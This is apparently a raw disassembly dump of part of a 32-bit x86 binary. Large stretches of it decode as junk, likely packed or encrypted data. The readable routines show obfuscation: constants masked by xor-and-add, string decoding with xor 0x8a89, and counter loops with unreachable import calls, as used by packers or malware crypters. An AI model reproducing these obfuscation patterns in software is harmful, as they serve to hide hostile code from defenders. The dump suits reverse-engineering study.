  4107e5:	outs   dx,DWORD PTR ds:[esi]
  4107e6:	(bad)  
  4107e8:	lock lods al,BYTE PTR ds:[esi]
  4107ea:	add    BYTE PTR [ebx-0x6703a021],cl
  4107f0:	fnclex 
  4107f2:	dec    ebx
  4107f3:	ins    BYTE PTR es:[edi],dx
  4107f4:	imul   esi,DWORD PTR [ecx],0xd
  4107f7:	mov    dh,ah
  4107f9:	inc    esi
  4107fa:	out    0x38,al
  4107fc:	push   es
  4107fd:	jne    0x41086f
  4107ff:	test   BYTE PTR [eax+0x699f102b],bh
  410805:	jge    0x41081d
  410807:	and    eax,esp
  410809:	fwait
  41080a:	es xchg ecx,eax
  41080c:	in     al,dx
  41080d:	cmp    BYTE PTR [eax+0xc],bl
  410810:	sbb    ebx,eax
  410812:	das    
  410813:	repnz sar ebx,cl
  410816:	mov    eax,ds:0xbf1eab90
  41081b:	or     dl,BYTE PTR [esi-0x5a1b3f7e]
  410821:	xor    cl,dh
  410823:	xor    BYTE PTR [eax+0x728fb142],ch
  410829:	retf   
  41082a:	xor    esp,DWORD PTR [edi+0x264f4bf7]
  410830:	pusha  
  410831:	mov    bh,0x8d
  410833:	dec    esp
  410834:	and    al,0x5a
  410836:	retf   0x57d5
  410839:	fidiv  DWORD PTR [ecx-0x4eacff14]
  41083f:	mov    ds:0x3901eb4c,eax
  410844:	cs xchg esi,eax
  410846:	in     al,dx
  410847:	out    0xbe,eax
  410849:	(bad)  
  41084a:	jmp    0x4107d9
  41084c:	and    eax,0xe933cd51
  410851:	repz pop ebx
  410853:	push   ebp
  410854:	jno    0x410834
  410856:	ret    
  410857:	dec    eax
  410858:	or     bl,bl
  41085a:	pop    es
  41085b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41085c:	rcr    BYTE PTR ds:0x40d6784e,0xe3
  410863:	mov    ebp,0xe5c5d989
  410868:	out    dx,al
  410869:	sbb    DWORD PTR [esi],eax
  41086b:	popa   
  41086c:	pop    esp
  41086d:	addr16 cmp bh,0xbc
  410871:	bound  esp,QWORD PTR [edi+0x7792057b]
  410877:	push   esp
  410878:	lds    edx,FWORD PTR [ecx+0x48]
  41087b:	adc    DWORD PTR [edx+0x32],0xf8779
  410882:	out    dx,eax
  410883:	scas   eax,DWORD PTR es:[edi]
  410884:	jnp    0x410893
  410886:	cmp    bh,al
  410888:	std    
  410889:	stc    
  41088a:	lahf   
  41088b:	add    cl,BYTE PTR [ebp-0x5c]
  41088e:	imul   DWORD PTR [eax]
  410890:	or     BYTE PTR [ecx],0xbc
  410893:	mov    edi,0xef1097e6
  410898:	out    0xd9,eax
  41089a:	inc    ebx
  41089b:	xor    BYTE PTR ds:0x2e71bae4,dh
  4108a1:	inc    esp
  4108a2:	into   
  4108a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108a4:	les    ecx,FWORD PTR [eax]
  4108a6:	mov    cl,BYTE PTR [esi+0x34]
  4108a9:	into   
  4108aa:	inc    esi
  4108ab:	and    DWORD PTR [esi-0x37d798ea],0x1200df8a
  4108b5:	add    al,0x88
  4108b7:	inc    esp
  4108b8:	jno    0x410893
  4108ba:	jns    0x41091a
  4108bc:	pop    ebx
  4108bd:	sar    DWORD PTR [ebp-0x5e3aa32c],cl
  4108c3:	in     al,0x3a
  4108c5:	ins    DWORD PTR es:[edi],dx
  4108c6:	xchg   BYTE PTR [edx+0x10f74377],dl
  4108cc:	jle    0x410850
  4108ce:	(bad)  
  4108cf:	mov    edi,eax
  4108d1:	jle    0x41087e
  4108d3:	xor    bh,BYTE PTR [esi+0x34ce2116]
  4108d9:	retf   0xad11
  4108dc:	cmp    al,0xdc
  4108de:	cmp    ch,ch
  4108e0:	out    dx,eax
  4108e1:	push   ebp
  4108e2:	iret   
  4108e3:	sbb    eax,0xa9144644
  4108e8:	repz xor al,0x8f
  4108eb:	ins    DWORD PTR es:[edi],dx
  4108ec:	xlat   BYTE PTR ss:[ebx]
  4108ee:	jmp    FWORD PTR [ecx-0x60d69c12]
  4108f4:	inc    ecx
  4108f5:	lahf   
  4108f6:	mov    cl,ah
  4108f8:	jne    0x410887
  4108fa:	pop    ebp
  4108fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108fc:	sbb    eax,0x18379346
  410901:	jnp    0x4108d0
  410903:	retf   
  410904:	lahf   
  410905:	in     al,0xfb
  410907:	(bad)  
  410908:	sti    
  410909:	and    eax,0x2cf3d51f
  41090e:	lods   eax,DWORD PTR ds:[esi]
  41090f:	test   al,0xfd
  410911:	(bad)  
  410912:	sbb    DWORD PTR [esi+ebp*1],ebx
  410915:	sbb    esp,0x959ca8bb
  41091b:	cmp    DWORD PTR [edi],ebx
  41091d:	cmp    BYTE PTR [ebp+0x6c87df0f],cl
  410923:	std    
  410924:	sbb    DWORD PTR [ebx],edi
  410926:	or     ebx,eax
  410928:	jb     0x410944
  41092a:	push   esp
  41092b:	xor    DWORD PTR [ecx+ecx*8],ebx
  41092e:	loope  0x41098a
  410930:	pop    ss
  410931:	js     0x410976
  410933:	pop    edx
  410934:	fprem1 
  410936:	test   eax,0xc4a1d2a1
  41093b:	push   es
  41093c:	inc    esi
  41093d:	mov    bh,0x34
  41093f:	test   eax,0xfc02ac7c
  410944:	inc    edi
  410945:	or     al,0xd3
  410947:	and    edx,ebx
  410949:	or     BYTE PTR [ebp-0x4d],al
  41094c:	popa   
  41094d:	xlat   BYTE PTR ds:[ebx]
  41094e:	xor    eax,0x399bab25
  410953:	ins    DWORD PTR es:[edi],dx
  410954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410955:	inc    eax
  410956:	(bad)  
  410957:	xor    bl,BYTE PTR [edx+0x79]
  41095a:	cld    
  41095b:	cdq    
  41095c:	not    BYTE PTR [edx]
  41095e:	retf   0x9345
  410961:	jmp    0x1d1e89a9
  410966:	inc    ebp
  410967:	push   0xffffffb5
  410969:	lods   eax,DWORD PTR ds:[esi]
  41096a:	adc    cl,bh
  41096c:	div    DWORD PTR [edx]
  41096e:	int    0x45
  410970:	cld    
  410971:	inc    edi
  410972:	push   ds
  410973:	sbb    BYTE PTR [edi+0x25],ah
  410976:	mov    ebp,edi
  410978:	sar    DWORD PTR [esi-0x7],0xef
  41097c:	(bad)  
  41097d:	bound  esp,QWORD PTR [eax-0x50]
  410980:	int3   
  410981:	mov    dh,0x27
  410983:	push   0x5e11db08
  410988:	bound  eax,QWORD PTR [edi+0x35]
  41098b:	mov    edx,0x404e88f0
  410990:	out    0x68,eax
  410992:	add    eax,0x321c1a42
  410997:	outs   dx,DWORD PTR ds:[esi]
  410998:	adc    eax,DWORD PTR [edi*4+0x3f0662c1]
  41099f:	out    0x51,al
  4109a1:	push   ebx
  4109a2:	push   ecx
  4109a3:	jg     0x410970
  4109a5:	add    esi,ebx
  4109a7:	inc    eax
  4109a8:	push   esi
  4109a9:	das    
  4109aa:	lahf   
  4109ab:	push   edi
  4109ac:	scas   al,BYTE PTR es:[edi]
  4109ad:	pop    ss
  4109ae:	or     eax,0x9f56147a
  4109b3:	pop    ebp
  4109b4:	inc    eax
  4109b5:	and    dl,dl
  4109b7:	mov    WORD PTR [eax-0x6a],?
  4109ba:	int3   
  4109bb:	xchg   esp,edi
  4109bd:	dec    DWORD PTR [edx-0x10]
  4109c0:	or     dh,BYTE PTR [ebp-0x78354bb6]
  4109c6:	xor    ebp,DWORD PTR ds:0x98495dd6
  4109cc:	popa   
  4109cd:	cmp    eax,0x68caf2b2
  4109d2:	push   ds
  4109d3:	ret    
  4109d4:	xchg   ecx,eax
  4109d5:	xchg   BYTE PTR [edi],ah
  4109d7:	mov    ah,0x66
  4109d9:	cmp    ecx,edx
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx-0x35ad9d61],0xbc
  410fc4:	add    al,0x2e
  410fc6:	scas   al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x410f6d
  410fce:	pop    edx
  410fcf:	mov    esp,0x5bdb475e
  410fd4:	push   edi
  410fd5:	pop    edx
  410fd6:	pusha  
  410fd7:	xlat   BYTE PTR ds:[ebx]
  410fd8:	pushf  
  410fd9:	jp     0x410f5b
  410fdb:	fcom   QWORD PTR [edx]
  410fdd:	sbb    ch,BYTE PTR [eax+0x2]
  410fe0:	inc    edi
  410fe1:	add    DWORD PTR [eax],0xffffffc3
  410fe4:	jnp    0x41101c
  410fe6:	push   es
  410fe7:	and    DWORD PTR [edi],edx
  410fe9:	int    0xd3
  410feb:	hlt    
  410fec:	retf   0xfb50
  410fef:	and    BYTE PTR [ecx],bh
  410ff1:	inc    esi
  410ff2:	(bad)  
  410ff3:	cmp    BYTE PTR [eax+0x166141d0],ah
  410ff9:	fbstp  TBYTE PTR [edx-0x6d]
  410ffc:	(bad)  
  410ffd:	cli    
  410ffe:	in     al,dx
  410fff:	pop    es
  411000:	mov    ds:0xc01090d7,eax
  411005:	xchg   esp,eax
  411006:	icebp  
  411007:	add    eax,0xbba93aa2
  41100c:	gs mov ebx,0x82200867
  411012:	and    dh,ah
  411014:	pop    edi
  411015:	clc    
  411016:	jecxz  0x410ff5
  411018:	or     al,0xa
  41101a:	push   eax
  41101b:	lods   al,BYTE PTR ds:[esi]
  41101c:	cmp    al,0x24
  41101e:	jle    0x41108f
  411020:	daa    
  411021:	in     eax,0x87
  411023:	sub    eax,0xbddf3f28
  411028:	aas    
  411029:	inc    esp
  41102a:	lods   eax,DWORD PTR ds:[esi]
  41102b:	xor    edi,DWORD PTR [esi+0x218e3805]
  411031:	xchg   esi,eax
  411032:	stos   DWORD PTR es:[edi],eax
  411033:	(bad)  
  411034:	lods   eax,DWORD PTR ds:[esi]
  411035:	inc    eax
  411036:	add    ebx,DWORD PTR [esi+0x7b]
  411039:	and    BYTE PTR [ecx],bh
  41103b:	jg     0x4110bb
  41103d:	outs   dx,DWORD PTR ds:[esi]
  41103e:	mov    ebx,0x5277c94c
  411043:	dec    ebx
  411044:	clc    
  411045:	shl    eax,cl
  411047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411048:	mov    BYTE PTR [ecx+0x6306b746],0xab
  41104f:	pop    ecx
  411050:	pop    eax
  411051:	sub    eax,0xe0171ad4
  411056:	pushf  
  411057:	pop    esi
  411058:	in     eax,dx
  411059:	or     BYTE PTR [edi+0x2b609ae4],bh
  41105f:	inc    ebx
  411060:	test   eax,0x17703f5d
  411065:	pop    ebp
  411066:	jp     0x4110a7
  411068:	add    DWORD PTR [edx-0x45310687],0xc293a6c2
  411072:	adc    al,0xc9
  411074:	push   ds
  411075:	push   0x2aceecda
  41107a:	adc    ecx,DWORD PTR ds:0x39e00ef5
  411080:	xor    BYTE PTR [edi],dl
  411082:	jg     0x2d2945d7
  411088:	rcr    BYTE PTR [esi+0x60990661],1
  41108e:	retf   
  41108f:	aas    
  411090:	retf   
  411091:	(bad)  
  411092:	xchg   edx,eax
  411093:	fld    st(1)
  411095:	pop    ss
  411096:	xor    DWORD PTR [edx+0x3e630200],edx
  41109c:	loope  0x41108f
  41109e:	push   es
  41109f:	add    ebp,ebp
  4110a1:	inc    ebx
  4110a2:	adc    eax,0x277ffe67
  4110a7:	or     ebp,DWORD PTR [ecx+0x49]
  4110aa:	or     DWORD PTR [ecx-0x5d],0x66
  4110ae:	lahf   
  4110af:	sub    al,0x5
  4110b1:	daa    
  4110b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110b3:	lods   al,BYTE PTR ds:[esi]
  4110b4:	or     DWORD PTR [esp+ebp*1+0x7c8194c3],esi
  4110bb:	in     eax,0x3
  4110bd:	mul    BYTE PTR [esi]
  4110bf:	and    al,0x7e
  4110c1:	mov    cl,0x29
  4110c3:	cmp    BYTE PTR [ecx+0x65],bl
  4110c6:	sti    
  4110c7:	pop    ebx
  4110c8:	aad    0x1c
  4110ca:	aas    
  4110cb:	jle    0x411084
  4110cd:	int3   
  4110ce:	ja     0x4110da
  4110d0:	int    0xa9
  4110d2:	inc    ebx
  4110d3:	test   DWORD PTR [esi+0x5d],ebp
  4110d6:	(bad)  
  4110d7:	sbb    DWORD PTR [ecx+0x6854f15],ebx
  4110dd:	pop    esp
  4110de:	and    ch,BYTE PTR [esp+esi*2-0x48]
  4110e2:	mov    ebx,0xe85bf750
  4110e7:	pop    ebp
  4110e8:	sbb    BYTE PTR [edi],ch
  4110ea:	nop
  4110eb:	stc    
  4110ec:	pop    esp
  4110ed:	mov    ds:0xca5e40eb,al
  4110f2:	(bad)  
  4110f3:	xchg   ecx,eax
  4110f4:	add    edx,DWORD PTR [esi]
  4110f6:	push   es
  4110f7:	xchg   edx,eax
  4110f8:	rcl    ecx,1
  4110fa:	pop    esp
  4110fb:	nop
  4110fc:	arpl   WORD PTR [edx+0x5ad105a7],ax
  411102:	call   0xcb6d:0xfbdf66a4
  411109:	pop    ss
  41110a:	adc    eax,0x343eb408
  41110f:	pop    eax
  411110:	aad    0x18
  411112:	mov    al,0xe5
  411114:	push   ebx
  411115:	js     0x4110bd
  411117:	outs   dx,DWORD PTR ds:[esi]
  411118:	bound  esp,QWORD PTR [esi-0x3702c243]
  41111e:	xchg   esi,eax
  41111f:	xor    ah,BYTE PTR [eax+0x3d]
  411122:	(bad)  
  411123:	stos   BYTE PTR es:[edi],al
  411124:	mov    ecx,0x8b3e6042
  411129:	jl     0x411186
  41112b:	out    dx,al
  41112c:	in     al,dx
  41112d:	cmc    
  41112e:	lods   eax,DWORD PTR ds:[esi]
  41112f:	and    dl,bl
  411131:	mov    cs,WORD PTR [ebp+0x71788392]
  411137:	jbe    0x411153
  411139:	inc    edx
  41113a:	adc    esi,DWORD PTR [ecx+0x35]
  41113d:	stos   BYTE PTR es:[edi],al
  41113e:	adc    edi,DWORD PTR [edi+0x195db842]
  411144:	jmp    0x41119e
  411146:	pop    es
  411147:	nop
  411148:	pop    ecx
  411149:	xchg   esi,eax
  41114a:	(bad)  
  41114b:	adc    bh,BYTE PTR [esi+0x58]
  41114e:	or     al,cl
  411150:	inc    edx
  411151:	jo     0x411114
  411153:	jnp    0x411166
  411155:	pop    esp
  411156:	ds pop edi
  411158:	jne    0x41114c
  41115a:	mov    ebp,0xdc5c0254
  41115f:	push   edx
  411160:	cdq    
  411161:	adc    DWORD PTR [esi],edx
  411163:	gs cmp dh,al
  411166:	lods   eax,DWORD PTR ds:[esi]
  411167:	retf   0xe5ac
  41116a:	lahf   
  41116b:	fsubr  DWORD PTR [edx+0x2b]
  41116e:	in     eax,dx
  41116f:	lahf   
  411170:	xchg   ebx,eax
  411171:	ret    0xd717
  411174:	push   edi
  411175:	jecxz  0x41118d
  411177:	jo     0x41115a
  411179:	push   eax
